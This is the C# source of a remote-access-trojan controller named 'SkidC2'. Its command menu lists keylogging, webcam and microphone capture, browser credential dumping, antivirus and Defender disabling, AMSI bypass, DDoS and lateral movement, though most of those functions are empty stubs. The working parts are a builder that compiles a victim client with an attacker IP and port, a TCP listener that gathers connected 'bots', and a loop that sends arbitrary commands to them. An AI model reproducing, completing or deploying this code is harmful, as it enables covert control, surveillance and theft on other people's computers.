using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.CodeDom.Compiler;
using System.IO;
using System.Reflection;
using System.Text;
using System.Drawing;
using System.Windows.Forms;
using Microsoft.CSharp;
using System.Net.Http;
using System.Collections.Concurrent;
using System.Collections.Generic;

namespace SkidC2
{
    class Program
    {
        static TcpListener _listener;
        static bool _isListening = false;
        static Thread _listenerThread;
        static List<TcpClient> _connectedClients = new List<TcpClient>();


        static void Main(string[] args)
        {
            Console.Title = "SKIDC2 - ALL-IN-ONE RAT CONTROLLER";
            Console.WriteLine(@"
  / __/ /__ (_)__/ / ___/_  |
 _\ \/  '_// / _  / /__/ __/ 
/___/_/\_\/_/\_,_/\___/____/ 
            ");
            ShowHelp();

            string input;
            do
            {
                Console.Write("\nSKIDC2> ");
                input = Console.ReadLine()?.Trim().ToLower() ?? "";

                switch (input)
                {
                    case "build":
                        BuildClient();
                        break;
                    case "listen":
                        StartListener();
                        break;
                    case "hvnc":
                        LaunchHvnc();
                        break;
                    case "screenshot":
                        TakeScreenshot();
                        break;
                    case "desktop":
                        RemoteDesktop();
                        break;
                    case "information":
                        GetInformation();
                        break;

                    // === BOT MANAGEMENT ===
                    case "list":
                        ListBots();
                        break;
                    case "interact":
                        InteractWithBot();
                        break;
                    case "kill":
                        KillBot();
                        break;
                    case "broadcast":
                        BroadcastCommand();
                        break;

                    // === FILE OPERATIONS ===
                    case "download":
                        DownloadFile();
                        break;
                    case "upload":
                        UploadFile();
                        break;
                    case "ls":
                        ListDirectory();
                        break;
                    case "cd":
                        ChangeDirectory();
                        break;
                    case "cat":
                        ViewFile();
                        break;
                    case "rm":
                        DeleteFile();
                        break;
                    case "execute":
                        ExecuteFile();
                        break;

                    // === SURVEILLANCE ===
                    case "keylog":
                        GetKeylog();
                        break;
                    case "processes":
                        ListProcesses();
                        break;
                    case "webcam":
                        CaptureWebcam();
                        break;
                    case "mic":
                        RecordMicrophone();
                        break;
                    case "clipboard":
                        GetClipboard();
                        break;

                    // === SYSTEM MANIPULATION ===
                    case "lock":
                        LockWorkstation();
                        break;
                    case "shutdown":
                        ForceShutdown();
                        break;
                    case "reboot":
                        ForceReboot();
                        break;
                    case "bsod":
                        TriggerBSOD();
                        break;
                    case "message":
                        ShowMessageBox();
                        break;

                    // === PERSISTENCE & STEALTH ===
                    case "persist":
                        AddPersistence();
                        break;
                    case "unpersist":
                        RemovePersistence();
                        break;
                    case "hide":
                        HideProcess();
                        break;
                    case "migrate":
                        MigrateToProcess();
                        break;
                    case "uninstall":
                        UninstallBot();
                        break;

                    // === NETWORK ATTACKS ===
                    case "arp":
                        ArpPoison();
                        break;
                    case "portscan":
                        PortScan();
                        break;
                    case "netscan":
                        NetworkScan();
                        break;
                    case "ddos":
                        StartDDoS();
                        break;
                    case "proxy":
                        SetupProxy();
                        break;

                    // === INFORMATION GATHERING ===
                    case "wifi":
                        ShowWifiPasswords();
                        break;
                    case "browser":
                        DumpBrowserCredentials();
                        break;
                    case "tokens":
                        ListTokens();
                        break;
                    case "network":
                        ShowNetworkShares();
                        break;
                    case "systeminfo":
                        GetSystemInfo();
                        break;
                    case "hotfixes":
                        CheckHotfixes();
                        break;

                    // === DEFENSE EVASION ===
                    case "avkill":
                        KillAntivirus();
                        break;
                    case "firewall":
                        DisableFirewall();
                        break;
                    case "defender":
                        DisableDefender();
                        break;
                    case "amsi":
                        BypassAMSI();
                        break;
                    case "patches":
                        CheckPatches();
                        break;

                    // === LATERAL MOVEMENT ===
                    case "psexec":
                        Psexec();
                        break;
                    case "wmi":
                        WMICommand();
                        break;
                    case "pth":
                        PassTheHash();
                        break;
                    case "smb":
                        SMBAttack();
                        break;
                    case "rdp":
                        EnableRDP();
                        break;

                    // === SERVER MANAGEMENT ===
                    case "clear":
                        Console.Clear();
                        break;
                    case "status":
                        ShowServerStatus();
                        break;
                    case "config":
                        ChangeConfig();
                        break;
                    case "save":
                        SaveSessions();
                        break;
                    case "load":
                        LoadSessions();
                        break;
                    case "help":
                        ShowHelp();
                        break;
                    case "exit":
                        Console.WriteLine("[+] Goodbye, skid.");
                        break;
                    default:
                        Console.WriteLine("[-] Unknown command. Type 'help'.");
                        break;
                }
            } while (input != "exit");
        }

        // === BOT MANAGEMENT ===
        static void BroadcastCommand() { Console.WriteLine("[-] Not implemented yet"); }

        // === FILE OPERATIONS ===
        static void DownloadFile() { Console.WriteLine("[-] Not implemented yet"); }
        static void UploadFile() { Console.WriteLine("[-] Not implemented yet"); }
        static void ListDirectory() { Console.WriteLine("[-] Not implemented yet"); }
        static void ChangeDirectory() { Console.WriteLine("[-] Not implemented yet"); }
        static void ViewFile() { Console.WriteLine("[-] Not implemented yet"); }
        static void DeleteFile() { Console.WriteLine("[-] Not implemented yet"); }
        static void ExecuteFile() { Console.WriteLine("[-] Not implemented yet"); }

        // === SURVEILLANCE ===
        static void GetKeylog() { Console.WriteLine("[-] Not implemented yet"); }
        static void ListProcesses() { Console.WriteLine("[-] Not implemented yet"); }
        static void CaptureWebcam() { Console.WriteLine("[-] Not implemented yet"); }
        static void RecordMicrophone() { Console.WriteLine("[-] Not implemented yet"); }
        static void GetClipboard() { Console.WriteLine("[-] Not implemented yet"); }

        // === SYSTEM MANIPULATION ===
        static void LockWorkstation() { Console.WriteLine("[-] Not implemented yet"); }
        static void ForceShutdown() { Console.WriteLine("[-] Not implemented yet"); }
        static void ForceReboot() { Console.WriteLine("[-] Not implemented yet"); }
        static void TriggerBSOD() { Console.WriteLine("[-] Not implemented yet"); }
        static void ShowMessageBox() { Console.WriteLine("[-] Not implemented yet"); }

        // === PERSISTENCE & STEALTH ===
        static void AddPersistence() { Console.WriteLine("[-] Not implemented yet"); }
        static void RemovePersistence() { Console.WriteLine("[-] Not implemented yet"); }
        static void HideProcess() { Console.WriteLine("[-] Not implemented yet"); }
        static void MigrateToProcess() { Console.WriteLine("[-] Not implemented yet"); }
        static void UninstallBot() { Console.WriteLine("[-] Not implemented yet"); }

        // === NETWORK ATTACKS ===
        static void ArpPoison() { Console.WriteLine("[-] Not implemented yet"); }
        static void PortScan() { Console.WriteLine("[-] Not implemented yet"); }
        static void NetworkScan() { Console.WriteLine("[-] Not implemented yet"); }
        static void StartDDoS() { Console.WriteLine("[-] Not implemented yet"); }
        static void SetupProxy() { Console.WriteLine("[-] Not implemented yet"); }

        // === INFORMATION GATHERING ===
        static void ShowWifiPasswords() { Console.WriteLine("[-] Not implemented yet"); }
        static void DumpBrowserCredentials() { Console.WriteLine("[-] Not implemented yet"); }
        static void ListTokens() { Console.WriteLine("[-] Not implemented yet"); }
        static void ShowNetworkShares() { Console.WriteLine("[-] Not implemented yet"); }
        static void GetSystemInfo() { Console.WriteLine("[-] Not implemented yet"); }
        static void CheckHotfixes() { Console.WriteLine("[-] Not implemented yet"); }

        // === DEFENSE EVASION ===
        static void KillAntivirus() { Console.WriteLine("[-] Not implemented yet"); }
        static void DisableFirewall() { Console.WriteLine("[-] Not implemented yet"); }
        static void DisableDefender() { Console.WriteLine("[-] Not implemented yet"); }
        static void BypassAMSI() { Console.WriteLine("[-] Not implemented yet"); }
        static void CheckPatches() { Console.WriteLine("[-] Not implemented yet"); }

        // === LATERAL MOVEMENT ===
        static void Psexec() { Console.WriteLine("[-] Not implemented yet"); }
        static void WMICommand() { Console.WriteLine("[-] Not implemented yet"); }
        static void PassTheHash() { Console.WriteLine("[-] Not implemented yet"); }
        static void SMBAttack() { Console.WriteLine("[-] Not implemented yet"); }
        static void EnableRDP() { Console.WriteLine("[-] Not implemented yet"); }

        // === SERVER MANAGEMENT ===
        static void ShowServerStatus() { Console.WriteLine("[-] Not implemented yet"); }
        static void ChangeConfig() { Console.WriteLine("[-] Not implemented yet"); }
        static void SaveSessions() { Console.WriteLine("[-] Not implemented yet"); }
        static void LoadSessions() { Console.WriteLine("[-] Not implemented yet"); }

        static void ShowHelp()
        {
            Console.WriteLine(@"
[+] SKIDC2 - ULTIMATE COMMAND LIST

    BASIC:
      build         - Build client with IP/Port
      listen        - Start listener on port
      hvnc          - Launch Hidden VNC
      screenshot    - Take screenshot
      desktop       - Remote desktop
      information   - Basic system info

    BOT MANAGEMENT:
      list          - List connected bots
      interact <#>  - Interact with specific bot
      kill <#>      - Disconnect bot
      broadcast     - Send command to all bots

    FILE OPERATIONS:
      download      - Download file from bot
      upload        - Upload file to bot
      ls            - List directory
      cd            - Change directory
      cat           - View file
      rm            - Delete file
      execute       - Execute file

    SURVEILLANCE:
      keylog        - Get keystroke log
      processes     - List running processes
      webcam        - Capture webcam
      mic           - Record microphone
      clipboard     - Get clipboard contents

    SYSTEM:
      lock          - Lock workstation
      shutdown      - Force shutdown
      reboot        - Force reboot
      bsod          - Trigger Blue Screen
      message       - Show message box

    PERSISTENCE:
      persist       - Add persistence
      unpersist     - Remove persistence
      hide          - Hide process
      migrate       - Migrate to process
      uninstall     - Uninstall bot

    NETWORK:
      arp           - ARP poisoning
      portscan      - Port scan
      netscan       - Network scan
      ddos          - DDoS attack
      proxy         - Setup SOCKS proxy

    RECON:
      wifi          - Show WiFi passwords
      browser       - Dump browser data
      tokens        - List security tokens
      network       - Show network shares
      systeminfo    - Detailed system info
      hotfixes      - Check installed updates

    DEFENSE:
      avkill        - Kill antivirus
      firewall      - Disable firewall
      defender      - Disable Windows Defender
      amsi          - Bypass AMSI
      patches       - Check vulnerability patches

    LATERAL MOVEMENT:
      psexec        - PsExec execution
      wmi           - WMI command
      pth           - Pass-the-hash
      smb           - SMB enumeration
      rdp           - Enable RDP

    SERVER:
      clear         - Clear console
      status        - Show server status
      config        - Change server config
      save          - Save sessions to file
      load          - Load sessions from file
      help          - Show this help
      exit          - Exit server

[+] Usage: [command] [bot_index] [parameters]
");
        }

        static void BuildClient()
        {
            Console.Write("[+] Enter IP for client: ");
            string ip = Console.ReadLine();
            Console.Write("[+] Enter Port for client: ");
            if (!int.TryParse(Console.ReadLine(), out int port))
            {
                Console.WriteLine("[-] Invalid port.");
                return;
            }

            string clientCode;
            var assembly = Assembly.GetExecutingAssembly();
            var resourceName = "SkidC2.ClientTemplate.cs";

            using (Stream stream = assembly.GetManifestResourceStream(resourceName))
            using (StreamReader reader = new StreamReader(stream))
            {
                clientCode = reader.ReadToEnd();
            }

            clientCode = clientCode.Replace("\"REPLACE_IP\"", "\"" + ip + "\"")
                                   .Replace("1337", port.ToString()); 

            CodeDomProvider provider = CodeDomProvider.CreateProvider("CSharp");
            CompilerParameters parameters = new CompilerParameters();
            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = "Client.exe";
            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            parameters.ReferencedAssemblies.Add("System.Drawing.dll");

            CompilerResults results = provider.CompileAssemblyFromSource(parameters, clientCode);
            if (results.Errors.HasErrors)
            {
                Console.WriteLine("[-] Build failed:");
                foreach (CompilerError error in results.Errors)
                {
                    Console.WriteLine($"  {error.ErrorText}");
                }
            }
            else
            {
                Console.WriteLine($"[+] Client built successfully: {Path.GetFullPath(parameters.OutputAssembly)}");
            }
        }

        static void StartListener()
        {
            Console.Write("[+] Enter port to listen on: ");
            if (!int.TryParse(Console.ReadLine(), out int port))
            {
                Console.WriteLine("[-] Invalid port.");
                return;
            }

            _listener = new TcpListener(IPAddress.Any, port);
            _listenerThread = new Thread(() =>
            {
                _isListening = true;
                _listener.Start();
                Console.WriteLine($"[+] Listening on port {port}...");

                while (_isListening)
                {
                    try
                    {
                        TcpClient client = _listener.AcceptTcpClient();
                        Thread clientThread = new Thread(HandleClient);
                        clientThread.IsBackground = true;
                        clientThread.Start(client);
                    }
                    catch (Exception ex)
                    {
                        if (_isListening)
                            Console.WriteLine($"[-] Listener error: {ex.Message}");
                    }
                }
            });

            _listenerThread.IsBackground = true;
            _listenerThread.Start();
        }

        static void StopListener()
        {
            _isListening = false;
            _listener?.Stop();

            lock (_connectedClients)
            {
                foreach (TcpClient client in _connectedClients)
                {
                    try { client.Close(); } catch { }
                }
                _connectedClients.Clear();
            }
        }

        static void HandleClient(object obj)
        {
            TcpClient client = (TcpClient)obj;
            string clientEndpoint = client.Client.RemoteEndPoint.ToString();

            lock (_connectedClients)
            {
                _connectedClients.Add(client);
            }

            Console.WriteLine($"[+] New connection from: {clientEndpoint}");
            Console.WriteLine($"[+] Total bots: {_connectedClients.Count}");

            NetworkStream stream = client.GetStream();
            byte[] buffer = new byte[4096];

            try
            {
                while (client.Connected)
                {
                    int bytesRead = stream.Read(buffer, 0, buffer.Length);
                    if (bytesRead == 0) break;

                    string response = Encoding.ASCII.GetString(buffer, 0, bytesRead);
                    Console.WriteLine($"[RESPONSE from {clientEndpoint}] {response}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Client {clientEndpoint} error: {ex.Message}");
            }
            finally
            {
                lock (_connectedClients)
                {
                    _connectedClients.Remove(client);
                }
                client.Close();
                Console.WriteLine($"[+] Client {clientEndpoint} disconnected.");
                Console.WriteLine($"[+] Total bots: {_connectedClients.Count}");
            }
        }



        static void ListBots()
        {
            lock (_connectedClients)
            {
                if (_connectedClients.Count == 0)
                {
                    Console.WriteLine("[-] No connected bots.");
                    return;
                }

                Console.WriteLine("\n[+] Connected Bots:");
                Console.WriteLine("INDEX | IP:PORT");
                Console.WriteLine("------|---------");

                for (int i = 0; i < _connectedClients.Count; i++)
                {
                    TcpClient bot = _connectedClients[i];
                    if (bot.Connected)
                    {
                        string endpoint = bot.Client.RemoteEndPoint.ToString();
                        Console.WriteLine($"  {i}   | {endpoint}");
                    }
                    else
                    {
                        _connectedClients.RemoveAt(i);
                        i--;
                    }
                }
            }
        }

        static void InteractWithBot()
        {
            Console.Write("[+] Enter bot index: ");
            if (!int.TryParse(Console.ReadLine(), out int index))
            {
                Console.WriteLine("[-] Invalid index.");
                return;
            }

            TcpClient bot;
            lock (_connectedClients)
            {
                if (index < 0 || index >= _connectedClients.Count)
                {
                    Console.WriteLine("[-] Invalid bot index.");
                    return;
                }
                bot = _connectedClients[index];
            }

            if (!bot.Connected)
            {
                Console.WriteLine("[-] Bot is not connected.");
                lock (_connectedClients)
                {
                    _connectedClients.Remove(bot);
                }
                return;
            }

            string endpoint = bot.Client.RemoteEndPoint.ToString();
            Console.WriteLine($"[+] Interacting with bot {index} ({endpoint})");
            Console.WriteLine("[+] Type 'exit' to return to main menu");

            NetworkStream stream = bot.GetStream();

            while (true)
            {
                Console.Write($"BOT/{index}> ");
                string command = Console.ReadLine();

                if (command.ToLower() == "exit")
                    break;

                if (string.IsNullOrEmpty(command))
                    continue;

                try
                {
                    byte[] cmdBytes = Encoding.ASCII.GetBytes(command);
                    stream.Write(cmdBytes, 0, cmdBytes.Length);
                    byte[] responseBytes = new byte[16384];
                    int bytesRead = stream.Read(responseBytes, 0, responseBytes.Length);
                    string response = Encoding.ASCII.GetString(responseBytes, 0, bytesRead);

                    Console.WriteLine($"[RESPONSE] {response}");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[-] Error: {ex.Message}");
                    break;
                }
            }
        }

        static void KillBot()
        {
            Console.Write("[+] Enter bot index to disconnect: ");
            if (!int.TryParse(Console.ReadLine(), out int index))
            {
                Console.WriteLine("[-] Invalid index.");
                return;
            }

            TcpClient bot;
            lock (_connectedClients)
            {
                if (index < 0 || index >= _connectedClients.Count)
                {
                    Console.WriteLine("[-] Invalid bot index.");
                    return;
                }
                bot = _connectedClients[index];
            }

            try
            {
                if (bot.Connected)
                {
                    bot.Close();
                    Console.WriteLine($"[+] Bot {index} disconnected.");
                }

                lock (_connectedClients)
                {
                    _connectedClients.Remove(bot);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error disconnecting bot: {ex.Message}");
            }
        }

        static void LaunchHvnc()
        {
            Console.WriteLine("[+] Launching HVNC...");
            Application.Run(new HvncForm());
        }

        static void SendCommandToClient(TcpClient client, string command)
        {
            try
            {
                NetworkStream stream = client.GetStream();
                byte[] cmdBytes = Encoding.ASCII.GetBytes(command);
                stream.Write(cmdBytes, 0, cmdBytes.Length);

                byte[] responseBytes = new byte[4096];
                int bytesRead = stream.Read(responseBytes, 0, responseBytes.Length);
                string response = Encoding.ASCII.GetString(responseBytes, 0, bytesRead);
                Console.WriteLine($"[Response] {response}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error sending command: {ex.Message}");
            }
        }

        static void TakeScreenshot()
        {
            try
            {
                int width = Screen.PrimaryScreen.Bounds.Width;
                int height = Screen.PrimaryScreen.Bounds.Height;

                using (Bitmap bmp = new Bitmap(width, height))
                {
                    using (Graphics g = Graphics.FromImage(bmp))
                    {
                        g.CopyFromScreen(0, 0, 0, 0, new Size(width, height));
                    }
                    string fileName = $"screenshot_{DateTime.Now:yyyyMMdd_HHmmss}.png";
                    bmp.Save(fileName, ImageFormat.Png);
                    Console.WriteLine($"[+] Screenshot saved: {Path.GetFullPath(fileName)}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Screenshot failed: {ex.Message}");
            }
        }

        static void RemoteDesktop()
        {
            Console.WriteLine("[-] Remote desktop feature not implemented yet. (Requires VNC library)");
        }

        static void GetInformation()
        {
            string info = $@"[+] System Information:
    User: {Environment.UserName}
    Machine: {Environment.MachineName}
    OS: {Environment.OSVersion}
    64-bit OS: {Environment.Is64BitOperatingSystem}
    CPU Cores: {Environment.ProcessorCount}
    System Directory: {Environment.SystemDirectory}
    CLR Version: {Environment.Version}
";
            Console.WriteLine(info);
        }

        static void InteractWithClient()
        {
            Console.Write("[+] Enter client IP:PORT to interact with: ");
            string clientId = Console.ReadLine();
            Console.WriteLine($"[+] Interacting with {clientId}. Type 'exit' to return.");
            while (true)
            {
                Console.Write($"SKIDC2/{clientId}> ");
                string cmd = Console.ReadLine();
                if (cmd == "exit") break;
            }
        }

        static void KeylogClient()
        {
            Console.Write("[+] Enter client IP:PORT to keylog: ");
            string clientId = Console.ReadLine();
        }

        static void NetScanClient()
        {
            Console.Write("[+] Enter client IP:PORT to netscan: ");
            string clientId = Console.ReadLine();
        }
    }
}